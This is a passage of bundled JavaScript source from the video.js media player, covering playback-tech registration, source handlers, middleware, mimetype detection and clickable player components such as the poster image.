   * overwrite this.
   *
   * @param  {string} type
   *         The mimetype to check for support
   *
   * @return {string}
   *         'probably', 'maybe', or empty string
   *
   * @see [Spec]{@link https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/canPlayType}
   *
   * @abstract
   */


  Tech.prototype.canPlayType = function canPlayType() {
    return '';
  };

  /**
   * Check if the type is supported by this tech.
   *
   * The base tech does not support any type, but source handlers might
   * overwrite this.
   *
   * @param {string} type
   *        The media type to check
   * @return {string} Returns the native video element's response
   */


  Tech.canPlayType = function canPlayType() {
    return '';
  };

  /**
   * Check if the tech can support the given source
   * @param {Object} srcObj
   *        The source object
   * @param {Object} options
   *        The options passed to the tech
   * @return {string} 'probably', 'maybe', or '' (empty string)
   */


  Tech.canPlaySource = function canPlaySource(srcObj, options) {
    return Tech.canPlayType(srcObj.type);
  };

  /*
   * Return whether the argument is a Tech or not.
   * Can be passed either a Class like `Html5` or a instance like `player.tech_`
   *
   * @param {Object} component
   *        The item to check
   *
   * @return {boolean}
   *         Whether it is a tech or not
   *         - True if it is a tech
   *         - False if it is not
   */


  Tech.isTech = function isTech(component) {
    return component.prototype instanceof Tech || component instanceof Tech || component === Tech;
  };

  /**
   * Registers a `Tech` into a shared list for videojs.
   *
   * @param {string} name
   *        Name of the `Tech` to register.
   *
   * @param {Object} tech
   *        The `Tech` class to register.
   */


  Tech.registerTech = function registerTech(name, tech) {
    if (!Tech.techs_) {
      Tech.techs_ = {};
    }

    if (!Tech.isTech(tech)) {
      throw new Error('Tech ' + name + ' must be a Tech');
    }

    if (!Tech.canPlayType) {
      throw new Error('Techs must have a static canPlayType method on them');
    }
    if (!Tech.canPlaySource) {
      throw new Error('Techs must have a static canPlaySource method on them');
    }

    name = toTitleCase(name);

    Tech.techs_[name] = tech;
    if (name !== 'Tech') {
      // camel case the techName for use in techOrder
      Tech.defaultTechOrder_.push(name);
    }
    return tech;
  };

  /**
   * Get a `Tech` from the shared list by name.
   *
   * @param {string} name
   *        `camelCase` or `TitleCase` name of the Tech to get
   *
   * @return {Tech|undefined}
   *         The `Tech` or undefined if there was no tech with the name requsted.
   */


  Tech.getTech = function getTech(name) {
    if (!name) {
      return;
    }

    name = toTitleCase(name);

    if (Tech.techs_ && Tech.techs_[name]) {
      return Tech.techs_[name];
    }

    if (window_1 && window_1.videojs && window_1.videojs[name]) {
      log$1.warn('The ' + name + ' tech was added to the videojs object when it should be registered using videojs.registerTech(name, tech)');
      return window_1.videojs[name];
    }
  };

  return Tech;
}(Component);

/**
 * Get the {@link VideoTrackList}
 *
 * @returns {VideoTrackList}
 * @method Tech.prototype.videoTracks
 */

/**
 * Get the {@link AudioTrackList}
 *
 * @returns {AudioTrackList}
 * @method Tech.prototype.audioTracks
 */

/**
 * Get the {@link TextTrackList}
 *
 * @returns {TextTrackList}
 * @method Tech.prototype.textTracks
 */

/**
 * Get the remote element {@link TextTrackList}
 *
 * @returns {TextTrackList}
 * @method Tech.prototype.remoteTextTracks
 */

/**
 * Get the remote element {@link HtmlTrackElementList}
 *
 * @returns {HtmlTrackElementList}
 * @method Tech.prototype.remoteTextTrackEls
 */

ALL.names.forEach(function (name) {
  var props = ALL[name];

  Tech.prototype[props.getterName] = function () {
    this[props.privateName] = this[props.privateName] || new props.ListClass();
    return this[props.privateName];
  };
});

/**
 * List of associated text tracks
 *
 * @type {TextTrackList}
 * @private
 * @property Tech#textTracks_
 */

/**
 * List of associated audio tracks.
 *
 * @type {AudioTrackList}
 * @private
 * @property Tech#audioTracks_
 */

/**
 * List of associated video tracks.
 *
 * @type {VideoTrackList}
 * @private
 * @property Tech#videoTracks_
 */

/**
 * Boolean indicating wether the `Tech` supports volume control.
 *
 * @type {boolean}
 * @default
 */
Tech.prototype.featuresVolumeControl = true;

/**
 * Boolean indicating wether the `Tech` support fullscreen resize control.
 * Resizing plugins using request fullscreen reloads the plugin
 *
 * @type {boolean}
 * @default
 */
Tech.prototype.featuresFullscreenResize = false;

/**
 * Boolean indicating wether the `Tech` supports changing the speed at which the video
 * plays. Examples:
 *   - Set player to play 2x (twice) as fast
 *   - Set player to play 0.5x (half) as fast
 *
 * @type {boolean}
 * @default
 */
Tech.prototype.featuresPlaybackRate = false;

/**
 * Boolean indicating wether the `Tech` supports the `progress` event. This is currently
 * not triggered by video-js-swf. This will be used to determine if
 * {@link Tech#manualProgressOn} should be called.
 *
 * @type {boolean}
 * @default
 */
Tech.prototype.featuresProgressEvents = false;

/**
 * Boolean indicating wether the `Tech` supports the `sourceset` event.
 *
 * A tech should set this to `true` and then use {@link Tech#triggerSourceset}
 * to trigger a {@link Tech#event:sourceset} at the earliest time after getting
 * a new source.
 *
 * @type {boolean}
 * @default
 */
Tech.prototype.featuresSourceset = false;

/**
 * Boolean indicating wether the `Tech` supports the `timeupdate` event. This is currently
 * not triggered by video-js-swf. This will be used to determine if
 * {@link Tech#manualTimeUpdates} should be called.
 *
 * @type {boolean}
 * @default
 */
Tech.prototype.featuresTimeupdateEvents = false;

/**
 * Boolean indicating wether the `Tech` supports the native `TextTrack`s.
 * This will help us integrate with native `TextTrack`s if the browser supports them.
 *
 * @type {boolean}
 * @default
 */
Tech.prototype.featuresNativeTextTracks = false;

/**
 * A functional mixin for techs that want to use the Source Handler pattern.
 * Source handlers are scripts for handling specific formats.
 * The source handler pattern is used for adaptive formats (HLS, DASH) that
 * manually load video data and feed it into a Source Buffer (Media Source Extensions)
 * Example: `Tech.withSourceHandlers.call(MyTech);`
 *
 * @param {Tech} _Tech
 *        The tech to add source handler functions to.
 *
 * @mixes Tech~SourceHandlerAdditions
 */
Tech.withSourceHandlers = function (_Tech) {

  /**
   * Register a source handler
   *
   * @param {Function} handler
   *        The source handler class
   *
   * @param {number} [index]
   *        Register it at the following index
   */
  _Tech.registerSourceHandler = function (handler, index) {
    var handlers = _Tech.sourceHandlers;

    if (!handlers) {
      handlers = _Tech.sourceHandlers = [];
    }

    if (index === undefined) {
      // add to the end of the list
      index = handlers.length;
    }

    handlers.splice(index, 0, handler);
  };

  /**
   * Check if the tech can support the given type. Also checks the
   * Techs sourceHandlers.
   *
   * @param {string} type
   *         The mimetype to check.
   *
   * @return {string}
   *         'probably', 'maybe', or '' (empty string)
   */
  _Tech.canPlayType = function (type) {
    var handlers = _Tech.sourceHandlers || [];
    var can = void 0;

    for (var i = 0; i < handlers.length; i++) {
      can = handlers[i].canPlayType(type);

      if (can) {
        return can;
      }
    }

    return '';
  };

  /**
   * Returns the first source handler that supports the source.
   *
   * TODO: Answer question: should 'probably' be prioritized over 'maybe'
   *
   * @param {Tech~SourceObject} source
   *        The source object
   *
   * @param {Object} options
   *        The options passed to the tech
   *
   * @return {SourceHandler|null}
   *          The first source handler that supports the source or null if
   *          no SourceHandler supports the source
   */
  _Tech.selectSourceHandler = function (source, options) {
    var handlers = _Tech.sourceHandlers || [];
    var can = void 0;

    for (var i = 0; i < handlers.length; i++) {
      can = handlers[i].canHandleSource(source, options);

      if (can) {
        return handlers[i];
      }
    }

    return null;
  };

  /**
   * Check if the tech can support the given source.
   *
   * @param {Tech~SourceObject} srcObj
   *        The source object
   *
   * @param {Object} options
   *        The options passed to the tech
   *
   * @return {string}
   *         'probably', 'maybe', or '' (empty string)
   */
  _Tech.canPlaySource = function (srcObj, options) {
    var sh = _Tech.selectSourceHandler(srcObj, options);

    if (sh) {
      return sh.canHandleSource(srcObj, options);
    }

    return '';
  };

  /**
   * When using a source handler, prefer its implementation of
   * any function normally provided by the tech.
   */
  var deferrable = ['seekable', 'seeking', 'duration'];

  /**
   * A wrapper around {@link Tech#seekable} that will call a `SourceHandler`s seekable
   * function if it exists, with a fallback to the Techs seekable function.
   *
   * @method _Tech.seekable
   */

  /**
   * A wrapper around {@link Tech#duration} that will call a `SourceHandler`s duration
   * function if it exists, otherwise it will fallback to the techs duration function.
   *
   * @method _Tech.duration
   */

  deferrable.forEach(function (fnName) {
    var originalFn = this[fnName];

    if (typeof originalFn !== 'function') {
      return;
    }

    this[fnName] = function () {
      if (this.sourceHandler_ && this.sourceHandler_[fnName]) {
        return this.sourceHandler_[fnName].apply(this.sourceHandler_, arguments);
      }
      return originalFn.apply(this, arguments);
    };
  }, _Tech.prototype);

  /**
   * Create a function for setting the source using a source object
   * and source handlers.
   * Should never be called unless a source handler was found.
   *
   * @param {Tech~SourceObject} source
   *        A source object with src and type keys
   */
  _Tech.prototype.setSource = function (source) {
    var sh = _Tech.selectSourceHandler(source, this.options_);

    if (!sh) {
      // Fall back to a native source hander when unsupported sources are
      // deliberately set
      if (_Tech.nativeSourceHandler) {
        sh = _Tech.nativeSourceHandler;
      } else {
        log$1.error('No source hander found for the current source.');
      }
    }

    // Dispose any existing source handler
    this.disposeSourceHandler();
    this.off('dispose', this.disposeSourceHandler);

    if (sh !== _Tech.nativeSourceHandler) {
      this.currentSource_ = source;
    }

    this.sourceHandler_ = sh.handleSource(source, this, this.options_);
    this.on('dispose', this.disposeSourceHandler);
  };

  /**
   * Clean up any existing SourceHandlers and listeners when the Tech is disposed.
   *
   * @listens Tech#dispose
   */
  _Tech.prototype.disposeSourceHandler = function () {
    // if we have a source and get another one
    // then we are loading something new
    // than clear all of our current tracks
    if (this.currentSource_) {
      this.clearTracks(['audio', 'video']);
      this.currentSource_ = null;
    }

    // always clean up auto-text tracks
    this.cleanupAutoTextTracks();

    if (this.sourceHandler_) {

      if (this.sourceHandler_.dispose) {
        this.sourceHandler_.dispose();
      }

      this.sourceHandler_ = null;
    }
  };
};

// The base Tech class needs to be registered as a Component. It is the only
// Tech that can be registered as a Component.
Component.registerComponent('Tech', Tech);
Tech.registerTech('Tech', Tech);

/**
 * A list of techs that should be added to techOrder on Players
 *
 * @private
 */
Tech.defaultTechOrder_ = [];

var middlewares = {};
var middlewareInstances = {};

var TERMINATOR = {};

function use(type, middleware) {
  middlewares[type] = middlewares[type] || [];
  middlewares[type].push(middleware);
}



function setSource(player, src, next) {
  player.setTimeout(function () {
    return setSourceHelper(src, middlewares[src.type], next, player);
  }, 1);
}

function setTech(middleware, tech) {
  middleware.forEach(function (mw) {
    return mw.setTech && mw.setTech(tech);
  });
}

/**
 * Calls a getter on the tech first, through each middleware
 * from right to left to the player.
 */
function get$1(middleware, tech, method) {
  return middleware.reduceRight(middlewareIterator(method), tech[method]());
}

/**
 * Takes the argument given to the player and calls the setter method on each
 * middlware from left to right to the tech.
 */
function set$1(middleware, tech, method, arg) {
  return tech[method](middleware.reduce(middlewareIterator(method), arg));
}

/**
 * Takes the argument given to the player and calls the `call` version of the method
 * on each middleware from left to right.
 * Then, call the passed in method on the tech and return the result unchanged
 * back to the player, through middleware, this time from right to left.
 */
function mediate(middleware, tech, method) {
  var arg = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : null;

  var callMethod = 'call' + toTitleCase(method);
  var middlewareValue = middleware.reduce(middlewareIterator(callMethod), arg);
  var terminated = middlewareValue === TERMINATOR;
  var returnValue = terminated ? null : tech[method](middlewareValue);

  executeRight(middleware, method, returnValue, terminated);

  return returnValue;
}

var allowedGetters = {
  buffered: 1,
  currentTime: 1,
  duration: 1,
  seekable: 1,
  played: 1,
  paused: 1
};

var allowedSetters = {
  setCurrentTime: 1
};

var allowedMediators = {
  play: 1,
  pause: 1
};

function middlewareIterator(method) {
  return function (value, mw) {
    // if the previous middleware terminated, pass along the termination
    if (value === TERMINATOR) {
      return TERMINATOR;
    }

    if (mw[method]) {
      return mw[method](value);
    }

    return value;
  };
}

function executeRight(mws, method, value, terminated) {
  for (var i = mws.length - 1; i >= 0; i--) {
    var mw = mws[i];

    if (mw[method]) {
      mw[method](terminated, value);
    }
  }
}

function clearCacheForPlayer(player) {
  middlewareInstances[player.id()] = null;
}

/**
 * {
 *  [playerId]: [[mwFactory, mwInstance], ...]
 * }
 */
function getOrCreateFactory(player, mwFactory) {
  var mws = middlewareInstances[player.id()];
  var mw = null;

  if (mws === undefined || mws === null) {
    mw = mwFactory(player);
    middlewareInstances[player.id()] = [[mwFactory, mw]];
    return mw;
  }

  for (var i = 0; i < mws.length; i++) {
    var _mws$i = mws[i],
        mwf = _mws$i[0],
        mwi = _mws$i[1];


    if (mwf !== mwFactory) {
      continue;
    }

    mw = mwi;
  }

  if (mw === null) {
    mw = mwFactory(player);
    mws.push([mwFactory, mw]);
  }

  return mw;
}

function setSourceHelper() {
  var src = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
  var middleware = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : [];
  var next = arguments[2];
  var player = arguments[3];
  var acc = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : [];
  var lastRun = arguments.length > 5 && arguments[5] !== undefined ? arguments[5] : false;
  var mwFactory = middleware[0],
      mwrest = middleware.slice(1);

  // if mwFactory is a string, then we're at a fork in the road

  if (typeof mwFactory === 'string') {
    setSourceHelper(src, middlewares[mwFactory], next, player, acc, lastRun);

    // if we have an mwFactory, call it with the player to get the mw,
    // then call the mw's setSource method
  } else if (mwFactory) {
    var mw = getOrCreateFactory(player, mwFactory);

    mw.setSource(assign({}, src), function (err, _src) {

      // something happened, try the next middleware on the current level
      // make sure to use the old src
      if (err) {
        return setSourceHelper(src, mwrest, next, player, acc, lastRun);
      }

      // we've succeeded, now we need to go deeper
      acc.push(mw);

      // if it's the same type, continue down the current chain
      // otherwise, we want to go down the new chain
      setSourceHelper(_src, src.type === _src.type ? mwrest : middlewares[_src.type], next, player, acc, lastRun);
    });
  } else if (mwrest.length) {
    setSourceHelper(src, mwrest, next, player, acc, lastRun);
  } else if (lastRun) {
    next(src, acc);
  } else {
    setSourceHelper(src, middlewares['*'], next, player, acc, true);
  }
}

/**
 * Mimetypes
 *
 * @see http://hul.harvard.edu/ois/////systems/wax/wax-public-help/mimetypes.htm
 * @typedef Mimetypes~Kind
 * @enum
 */
var MimetypesKind = {
  opus: 'video/ogg',
  ogv: 'video/ogg',
  mp4: 'video/mp4',
  mov: 'video/mp4',
  m4v: 'video/mp4',
  mkv: 'video/x-matroska',
  mp3: 'audio/mpeg',
  aac: 'audio/aac',
  oga: 'audio/ogg',
  m3u8: 'application/x-mpegURL'
};

/**
 * Get the mimetype of a given src url if possible
 *
 * @param {string} src
 *        The url to the src
 *
 * @return {string}
 *         return the mimetype if it was known or empty string otherwise
 */
var getMimetype = function getMimetype() {
  var src = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : '';

  var ext = getFileExtension(src);
  var mimetype = MimetypesKind[ext.toLowerCase()];

  return mimetype || '';
};

/**
 * Find the mime type of a given source string if possible. Uses the player
 * source cache.
 *
 * @param {Player} player
 *        The player object
 *
 * @param {string} src
 *        The source string
 *
 * @return {string}
 *         The type that was found
 */
var findMimetype = function findMimetype(player, src) {
  if (!src) {
    return '';
  }

  // 1. check for the type in the `source` cache
  if (player.cache_.source.src === src && player.cache_.source.type) {
    return player.cache_.source.type;
  }

  // 2. see if we have this source in our `currentSources` cache
  var matchingSources = player.cache_.sources.filter(function (s) {
    return s.src === src;
  });

  if (matchingSources.length) {
    return matchingSources[0].type;
  }

  // 3. look for the src url in source elements and use the type there
  var sources = player.$$('source');

  for (var i = 0; i < sources.length; i++) {
    var s = sources[i];

    if (s.type && s.src && s.src === src) {
      return s.type;
    }
  }

  // 4. finally fallback to our list of mime types based on src url extension
  return getMimetype(src);
};

/**
 * @module filter-source
 */
/**
 * Filter out single bad source objects or multiple source objects in an
 * array. Also flattens nested source object arrays into a 1 dimensional
 * array of source objects.
 *
 * @param {Tech~SourceObject|Tech~SourceObject[]} src
 *        The src object to filter
 *
 * @return {Tech~SourceObject[]}
 *         An array of sourceobjects containing only valid sources
 *
 * @private
 */
var filterSource = function filterSource(src) {
  // traverse array
  if (Array.isArray(src)) {
    var newsrc = [];

    src.forEach(function (srcobj) {
      srcobj = filterSource(srcobj);

      if (Array.isArray(srcobj)) {
        newsrc = newsrc.concat(srcobj);
      } else if (isObject(srcobj)) {
        newsrc.push(srcobj);
      }
    });

    src = newsrc;
  } else if (typeof src === 'string' && src.trim()) {
    // convert string into object
    src = [fixSource({ src: src })];
  } else if (isObject(src) && typeof src.src === 'string' && src.src && src.src.trim()) {
    // src is already valid
    src = [fixSource(src)];
  } else {
    // invalid source, turn it into an empty array
    src = [];
  }

  return src;
};

/**
 * Checks src mimetype, adding it when possible
 *
 * @param {Tech~SourceObject} src
 *        The src object to check
 * @return {Tech~SourceObject}
 *        src Object with known type
 */
function fixSource(src) {
  var mimetype = getMimetype(src.src);

  if (!src.type && mimetype) {
    src.type = mimetype;
  }

  return src;
}

/**
 * @file loader.js
 */
/**
 * The `MediaLoader` is the `Component` that decides which playback technology to load
 * when a player is initialized.
 *
 * @extends Component
 */

var MediaLoader = function (_Component) {
  inherits(MediaLoader, _Component);

  /**
   * Create an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should attach to.
   *
   * @param {Object} [options]
   *        The key/value stroe of player options.
   *
   * @param {Component~ReadyCallback} [ready]
   *        The function that is run when this component is ready.
   */
  function MediaLoader(player, options, ready) {
    classCallCheck(this, MediaLoader);

    // MediaLoader has no element
    var options_ = mergeOptions({ createEl: false }, options);

    // If there are no sources when the player is initialized,
    // load the first supported playback technology.

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options_, ready));

    if (!options.playerOptions.sources || options.playerOptions.sources.length === 0) {
      for (var i = 0, j = options.playerOptions.techOrder; i < j.length; i++) {
        var techName = toTitleCase(j[i]);
        var tech = Tech.getTech(techName);

        // Support old behavior of techs being registered as components.
        // Remove once that deprecated behavior is removed.
        if (!techName) {
          tech = Component.getComponent(techName);
        }

        // Check if the browser supports this technology
        if (tech && tech.isSupported()) {
          player.loadTech_(techName);
          break;
        }
      }
    } else {
      // Loop through playback technologies (HTML5, Flash) and check for support.
      // Then load the best source.
      // A few assumptions here:
      //   All playback technologies respect preload false.
      player.src(options.playerOptions.sources);
    }
    return _this;
  }

  return MediaLoader;
}(Component);

Component.registerComponent('MediaLoader', MediaLoader);

/**
 * @file button.js
 */
/**
 * Clickable Component which is clickable or keyboard actionable,
 * but is not a native HTML button.
 *
 * @extends Component
 */

var ClickableComponent = function (_Component) {
  inherits(ClickableComponent, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param  {Player} player
   *         The `Player` that this class should be attached to.
   *
   * @param  {Object} [options]
   *         The key/value store of player options.
   */
  function ClickableComponent(player, options) {
    classCallCheck(this, ClickableComponent);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options));

    _this.emitTapEvents();

    _this.enable();
    return _this;
  }

  /**
   * Create the `Component`s DOM element.
   *
   * @param {string} [tag=div]
   *        The element's node type.
   *
   * @param {Object} [props={}]
   *        An object of properties that should be set on the element.
   *
   * @param {Object} [attributes={}]
   *        An object of attributes that should be set on the element.
   *
   * @return {Element}
   *         The element that gets created.
   */


  ClickableComponent.prototype.createEl = function createEl$$1() {
    var tag = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 'div';
    var props = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    var attributes = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : {};

    props = assign({
      innerHTML: '<span aria-hidden="true" class="vjs-icon-placeholder"></span>',
      className: this.buildCSSClass(),
      tabIndex: 0
    }, props);

    if (tag === 'button') {
      log$1.error('Creating a ClickableComponent with an HTML element of ' + tag + ' is not supported; use a Button instead.');
    }

    // Add ARIA attributes for clickable element which is not a native HTML button
    attributes = assign({
      role: 'button'
    }, attributes);

    this.tabIndex_ = props.tabIndex;

    var el = _Component.prototype.createEl.call(this, tag, props, attributes);

    this.createControlTextEl(el);

    return el;
  };

  ClickableComponent.prototype.dispose = function dispose() {
    // remove controlTextEl_ on dipose
    this.controlTextEl_ = null;

    _Component.prototype.dispose.call(this);
  };

  /**
   * Create a control text element on this `Component`
   *
   * @param {Element} [el]
   *        Parent element for the control text.
   *
   * @return {Element}
   *         The control text element that gets created.
   */


  ClickableComponent.prototype.createControlTextEl = function createControlTextEl(el) {
    this.controlTextEl_ = createEl('span', {
      className: 'vjs-control-text'
    }, {
      // let the screen reader user know that the text of the element may change
      'aria-live': 'polite'
    });

    if (el) {
      el.appendChild(this.controlTextEl_);
    }

    this.controlText(this.controlText_, el);

    return this.controlTextEl_;
  };

  /**
   * Get or set the localize text to use for the controls on the `Component`.
   *
   * @param {string} [text]
   *        Control text for element.
   *
   * @param {Element} [el=this.el()]
   *        Element to set the title on.
   *
   * @return {string}
   *         - The control text when getting
   */


  ClickableComponent.prototype.controlText = function controlText(text) {
    var el = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : this.el();

    if (text === undefined) {
      return this.controlText_ || 'Need Text';
    }

    var localizedText = this.localize(text);

    this.controlText_ = text;
    textContent(this.controlTextEl_, localizedText);
    if (!this.nonIconControl) {
      // Set title attribute if only an icon is shown
      el.setAttribute('title', localizedText);
    }
  };

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  ClickableComponent.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-control vjs-button ' + _Component.prototype.buildCSSClass.call(this);
  };

  /**
   * Enable this `Component`s element.
   */


  ClickableComponent.prototype.enable = function enable() {
    if (!this.enabled_) {
      this.enabled_ = true;
      this.removeClass('vjs-disabled');
      this.el_.setAttribute('aria-disabled', 'false');
      if (typeof this.tabIndex_ !== 'undefined') {
        this.el_.setAttribute('tabIndex', this.tabIndex_);
      }
      this.on(['tap', 'click'], this.handleClick);
      this.on('focus', this.handleFocus);
      this.on('blur', this.handleBlur);
    }
  };

  /**
   * Disable this `Component`s element.
   */


  ClickableComponent.prototype.disable = function disable() {
    this.enabled_ = false;
    this.addClass('vjs-disabled');
    this.el_.setAttribute('aria-disabled', 'true');
    if (typeof this.tabIndex_ !== 'undefined') {
      this.el_.removeAttribute('tabIndex');
    }
    this.off(['tap', 'click'], this.handleClick);
    this.off('focus', this.handleFocus);
    this.off('blur', this.handleBlur);
  };

  /**
   * This gets called when a `ClickableComponent` gets:
   * - Clicked (via the `click` event, listening starts in the constructor)
   * - Tapped (via the `tap` event, listening starts in the constructor)
   * - The following things happen in order:
   *   1. {@link ClickableComponent#handleFocus} is called via a `focus` event on the
   *      `ClickableComponent`.
   *   2. {@link ClickableComponent#handleFocus} adds a listener for `keydown` on using
   *      {@link ClickableComponent#handleKeyPress}.
   *   3. `ClickableComponent` has not had a `blur` event (`blur` means that focus was lost). The user presses
   *      the space or enter key.
   *   4. {@link ClickableComponent#handleKeyPress} calls this function with the `keydown`
   *      event as a parameter.
   *
   * @param {EventTarget~Event} event
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   * @abstract
   */


  ClickableComponent.prototype.handleClick = function handleClick(event) {};

  /**
   * This gets called when a `ClickableComponent` gains focus via a `focus` event.
   * Turns on listening for `keydown` events. When they happen it
   * calls `this.handleKeyPress`.
   *
   * @param {EventTarget~Event} event
   *        The `focus` event that caused this function to be called.
   *
   * @listens focus
   */


  ClickableComponent.prototype.handleFocus = function handleFocus(event) {
    on(document_1, 'keydown', bind(this, this.handleKeyPress));
  };

  /**
   * Called when this ClickableComponent has focus and a key gets pressed down. By
   * default it will call `this.handleClick` when the key is space or enter.
   *
   * @param {EventTarget~Event} event
   *        The `keydown` event that caused this function to be called.
   *
   * @listens keydown
   */


  ClickableComponent.prototype.handleKeyPress = function handleKeyPress(event) {

    // Support Space (32) or Enter (13) key operation to fire a click event
    if (event.which === 32 || event.which === 13) {
      event.preventDefault();
      this.trigger('click');
    } else if (_Component.prototype.handleKeyPress) {

      // Pass keypress handling up for unsupported keys
      _Component.prototype.handleKeyPress.call(this, event);
    }
  };

  /**
   * Called when a `ClickableComponent` loses focus. Turns off the listener for
   * `keydown` events. Which Stops `this.handleKeyPress` from getting called.
   *
   * @param {EventTarget~Event} event
   *        The `blur` event that caused this function to be called.
   *
   * @listens blur
   */


  ClickableComponent.prototype.handleBlur = function handleBlur(event) {
    off(document_1, 'keydown', bind(this, this.handleKeyPress));
  };

  return ClickableComponent;
}(Component);

Component.registerComponent('ClickableComponent', ClickableComponent);

/**
 * @file poster-image.js
 */
/**
 * A `ClickableComponent` that handles showing the poster image for the player.
 *
 * @extends ClickableComponent
 */

var PosterImage = function (_ClickableComponent) {
  inherits(PosterImage, _ClickableComponent);

  /**
   * Create an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should attach to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function PosterImage(player, options) {
    classCallCheck(this, PosterImage);

    var _this = possibleConstructorReturn(this, _ClickableComponent.call(this, player, options));

    _this.update();
    player.on('posterchange', bind(_this, _this.update));
    return _this;
  }

  /**
   * Clean up and dispose of the `PosterImage`.
   */


  PosterImage.prototype.dispose = function dispose() {
    this.player().off('posterchange', this.update);
    _ClickableComponent.prototype.dispose.call(this);
  };

  /**
   * Create the `PosterImage`s DOM element.
   *
   * @return {Element}
   *         The element that gets created.
   */


  PosterImage.prototype.createEl = function createEl$$1() {
    var el = createEl('div', {
      className: 'vjs-poster',

      // Don't want poster to be tabbable.
      tabIndex: -1
    });

    // To ensure the poster image resizes while maintaining its original aspect
    // ratio, use a div with `background-size` when available. For browsers that
    // do not support `background-size` (e.g. IE8), fall back on using a regular
    // img element.
    if (!BACKGROUND_SIZE_SUPPORTED) {
      this.fallbackImg_ = createEl('img');
      el.appendChild(this.fallbackImg_);
    }

    return el;
  };

  /**
   * An {@link EventTarget~EventListener} for {@link Player#posterchange} events.
   *
   * @listens Player#posterchange
   *
   * @param {EventTarget~Event} [event]
   *        The `Player#posterchange` event that triggered this function.
   */


  PosterImage.prototype.update = function update(event) {
    var url = this.player().poster();

    this.setSrc(url);

    // If there's no poster source we should display:none on this component
    // so it's not still clickable or right-clickable
    if (url) {
      this.show();
    } else {
      this.hide();
    }
  };

  /**
   * Set the source of the `PosterImage` depending on the display method.
   *
   * @param {string} url
   *        The URL to the source for the `PosterImage`.
   */


  PosterImage.prototype.setSrc = function setSrc(url) {
    if (this.fallbackImg_) {
      this.fallbackImg_.src = url;
    } else {
      var backgroundImage = '';

      // Any falsey values should stay as an empty string, otherwise
      // this will throw an extra error
      if (url) {
        backgroundImage = 'url("' + url + '")';
      }

      this.el_.style.backgroundImage = backgroundImage;
    }
  };

  /**
   * An {@link EventTarget~EventListener} for clicks on the `PosterImage`. See
   * {@link ClickableComponent#handleClick} for instances where this will be triggered.
   *
   * @listens tap
   * @listens click
   * @listens keydown
   *
   * @param {EventTarget~Event} event
   +        The `click`, `tap` or `keydown` event that caused this function to be called.
   */


  PosterImage.prototype.handleClick = function handleClick(event) {
    // We don't want a click to trigger playback when controls are disabled
    if (!this.player_.controls()) {
      return;
    }

    if (this.player_.paused()) {
      silencePromise(this.player_.play());
    } else {
      this.player_.pause();
    }
  };

  return PosterImage;
}(ClickableComponent);

Component.registerComponent('PosterImage', PosterImage);

/**
 * @file text-track-display.js
 */
var darkGray = '#222';
var lightGray = '#ccc';
var fontMap = {
  monospace: 'monospace',
  sansSerif: 'sans-serif',
  serif: 'serif',
  monospaceSansSerif: '"Andale Mono", "Lucida Console", monospace',
  monospaceSerif: '"Courier New", monospace',
  proportionalSansSerif: 'sans-serif',
  proportionalSerif: 'serif',
  casual: '"Comic Sans MS", Impact, fantasy',
  script: '"Monotype Corsiva", cursive',
  smallcaps: '"Andale Mono", "Lucida Console", monospace, sans-serif'
};

/**
 * Construct an rgba color from a given hex color code.
 *
 * @param {number} color
 *        Hex number for color, like #f0e.
 *
 * @param {number} opacity
 *        Value for opacity, 0.0 - 1.0.
 *
 * @return {string}
 *         The rgba color that was created, like 'rgba(255, 0, 0, 0.3)'.
 *
 * @private
 */
function constructColor(color, opacity) {
  return 'rgba(' +
  // color looks like "#f0e"
  parseInt(color[1] + color[1], 16) + ',' + parseInt(color[2] + color[2], 16) + ',' + parseInt(color[3] + color[3], 16) + ',' + opacity + ')';
}

/**
 * Try to update the style of a DOM element. Some style changes will throw an error,
 * particularly in IE8. Those should be noops.
 *
 * @param {Element} el
 *        The DOM element to be styled.
 *
 * @param {string} style
 *        The CSS property on the element that should be styled.
 *
 * @param {string} rule
 *        The style rule that should be applied to the property.
 *
 * @private
 */
function tryUpdateStyle(el, style, rule) {
  try {
    el.style[style] = rule;
  } catch (e) {

    // Satisfies linter.
    return;
  }
}

/**
 * The component for displaying text track cues.
 *
 * @extends Component
 */

var TextTrackDisplay = function (_Component) {
  inherits(TextTrackDisplay, _Component);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Component~ReadyCallback} [ready]
   *        The function to call when `TextTrackDisplay` is ready.
   */
  function TextTrackDisplay(player, options, ready) {
    classCallCheck(this, TextTrackDisplay);

    var _this = possibleConstructorReturn(this, _Component.call(this, player, options, ready));

    player.on('loadstart', bind(_this, _this.toggleDisplay));
    player.on('texttrackchange', bind(_this, _this.updateDisplay));
    player.on('loadstart', bind(_this, _this.preselectTrack));

    // This used to be called during player init, but was causing an error
    // if a track should show by default and the display hadn't loaded yet.
    // Should probably be moved to an external track loader when we support
    // tracks that don't need a display.
    player.ready(bind(_this, function () {
      if (player.tech_ && player.tech_.featuresNativeTextTracks) {
        this.hide();
        return;
      }

      player.on('fullscreenchange', bind(this, this.updateDisplay));

      var tracks = this.options_.playerOptions.tracks || [];

      for (var i = 0; i < tracks.length; i++) {
        this.player_.addRemoteTextTrack(tracks[i], true);
      }

      this.preselectTrack();
    }));
    return _this;
  }

  /**
  * Preselect a track following this precedence:
  * - matches the previously selected {@link TextTrack}'s language and kind
